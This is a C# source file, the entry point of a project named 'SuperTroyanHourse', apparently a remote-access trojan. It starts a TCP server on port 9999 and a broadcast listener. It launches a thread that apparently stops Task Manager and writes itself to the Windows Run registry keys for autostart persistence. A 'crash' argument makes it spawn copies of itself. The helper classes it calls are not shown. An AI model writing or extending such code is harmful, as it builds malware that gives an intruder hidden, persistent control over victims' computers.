using System;
using Microsoft.Win32;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;

namespace SuperTroyanHourse
{
    internal static class Program
    {


        internal static string FilesFolder = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + @"\STH\"; //Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\STH\";
        public const int port = 0x0000270f; // = 9999

        private static string pathToProperties = FilesFolder + "username.exe";
        public static string username = Environment.UserName;
        public static readonly string CurrentApplication = Application.StartupPath;

        public static Thread thread_check, thread_server, thread_broadcast;
        public static bool isProgramAlive = true;

        private static void Main(string[] args)
        {
            if (args.Length > 0 && args[0] == "crash")
            {
                Process.Start(Application.ExecutablePath, "crash");
                Process.Start(Application.ExecutablePath, "crash");
                return;
            }
            try
            {

                thread_broadcast = new Thread(new ThreadStart(BroadCastWaiter.StartBroadcastServer));
                thread_broadcast.Start();
                
                thread_server = new Thread(new ThreadStart(start));
                thread_server.Start();

                thread_check = new Thread(new ThreadStart(Internet.getLastModifiededDate));
                thread_check.Start();

                Thread thread_task = new Thread(new ThreadStart(other.TaskManeger.Stop));
                thread_task.Start();
            }
            catch { }
        }

        /// <summary>
        /// tries to put a registry to all users/current user to auto start
        /// </summary>
        /// <returns></returns>
        static bool RegistryWriter()
        {
            try
            {
                RegistryKey rkApp = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                rkApp.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath.ToString()), 
                    Application.ExecutablePath.ToString());
                return true;
            }
            catch
            {
                try
                {
                    RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rkApp.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath.ToString()),
                        Application.ExecutablePath.ToString());
                    return true;
                }
                catch
                {
                    return false;
                }
            }
        }

        private static void start()
        {
            if (Directory.Exists(Path.GetDirectoryName(pathToProperties)))
                if (File.Exists(pathToProperties))
                    username = File.ReadAllLines(pathToProperties)[0];
            TCPServer.Start();
        }

        #region world methods
        public static string[] argsConvertor(string arg)
        {
            string[] sArg = arg.Split(' ');
            int i = 0;
            List<string> args = new List<string>();
            for (; i < sArg.Length; i++)
            {
                if (sArg[i] == null || sArg[i] == "") continue;
                args.Add(sArg[i]);
                if (sArg[i][0] != '\"') continue;
                args[args.Count - 1] = args[args.Count - 1].Substring(1);
                for (i += 1; i < sArg.Length && sArg[i][sArg[i].Length - 1] != '\"'; i++)
                    args[args.Count - 1] += ' ' + sArg[i];
                args[args.Count - 1] += ' ' + sArg[i].Substring(0, sArg[i].Length - 1);
            }
            return args.ToArray();
        }

        public static double Floor(uint amount, double number)
        {
            int MAX = Convert.ToInt32(Math.Pow(0xA, amount));
            return Math.Round(number * MAX) / (double)MAX;
        }

        public static float Floor(uint amount, float number)
        {
            int MAX = Convert.ToInt32(Math.Pow(0xA, amount));
            return Convert.ToSingle(Math.Round(number * MAX) / (double)MAX);
        }

        public static T[] RemoveAt<T>(T[] source, int index)
        {
            T[] dest = new T[source.Length - 1];
            if (index > 0)
                Array.Copy(source, 0, dest, 0, index);

            if (index < source.Length - 1)
                Array.Copy(source, index + 1, dest, index, source.Length - index - 1);

            return dest;
        }
        #endregion world methods
    }
}